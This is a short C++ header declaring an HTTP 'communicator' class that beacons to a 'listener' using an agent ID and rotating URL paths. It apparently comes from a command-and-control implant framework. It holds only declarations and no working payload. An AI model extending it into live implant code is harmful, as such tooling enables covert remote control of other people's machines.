#pragma once
#include <Windows.h>
#include "utils/winapi.h"
#include "communicators/base.h"

/*
HTTP Communicator; connects to HTTP Listener
*/
class HttpCommunicator : public BaseCommunicator
{
private:
    PCHAR pUrlPathChoices; // Array of URL paths to query
    DWORD urlPathChoicesNum; // Num of URL paths to query
    DWORD lastUrlPathChoiceIndex; // Index of last URL path that was queried

public:
    /* Constructor; for initialisation */
    HttpCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWORD port, PCHAR pUrlPathChoices, PCHAR agentId);

    /* Destructor; for cleanup */
    ~HttpCommunicator();

    void CommunicateWithListener() override;
};